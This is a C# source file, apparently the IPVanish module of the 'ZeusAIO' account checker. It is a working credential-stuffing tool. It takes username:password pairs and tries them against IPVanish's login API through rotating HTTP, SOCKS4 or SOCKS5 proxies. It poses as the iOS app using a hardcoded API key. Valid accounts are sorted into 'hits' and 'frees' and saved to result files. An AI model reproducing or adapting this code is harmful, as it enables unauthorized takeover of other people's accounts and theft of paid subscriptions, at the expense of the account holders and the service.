using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json.Converters;
using System.Globalization;

namespace IpVanish
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "IPVanishVPN/36386 CFNetwork/1120 Darwin/19.0.0";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = false;
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
                            string post = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"os\":\"iOS_13_2_3\",\"api_key\":\"185f600f32cee535b0bef41ad77c1acd\",\"client\":\"IPVanishVPN_iOS_3.5.0_36386\",\"uuid\":\"F1D257D2-4B14-4F5B-B68E-B4C74B0F4101\"}";
                            string text2 = httpRequest.Post("https://account.ipvanish.com/api/v3/login", post, "application/json;charset=UTF-8").ToString();
                            bool flag7 = text2.Contains("account_type") || text2.Contains("expires_at");

                            if (flag7)
                            {
                                string AccountType = Regex.Match(text2, "account_type\":(.*?),").Groups[1].Value;
                                double dick = double.Parse(Regex.Match(text2, "sub_end_epoch\":(.*?),").Groups[1].Value);
                                string date = UnixTimeStampToDateTime(dick).ToString("dd-MMM-yyyy HH:mm:ss");

                                DateTime dt1 = DateTime.Parse(date);
                                DateTime dt2 = DateTime.Now;

                                if (dt1.Date > dt2.Date)
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - IPVANISH] " + s[0] + ":" + s[1] + " | Account Type: " + AccountType + " | Expires: " + date, Color.Green);
                                    }
                                    Export.AsResult("/Ipvanish_hits", s[0] + ":" + s[1] + " | Account Type: " + AccountType + " | Expires: " + date);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - IPVANISH] " + s[0] + ":" + s[1] + " | Expired", Color.OrangeRed);
                                    }
                                    Export.AsResult("/Ipvanish_frees", s[0] + ":" + s[1] + " | Expired");
                                    return false;
                                }
                              
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                        }
                        break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        public static DateTime UnixTimeStampToDateTime(double unixTimeStamp)
        {
            // Unix timestamp is seconds past epoch
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Utc);
            dtDateTime = dtDateTime.AddSeconds(unixTimeStamp).ToLocalTime();
            return dtDateTime;
        }
   
    }
}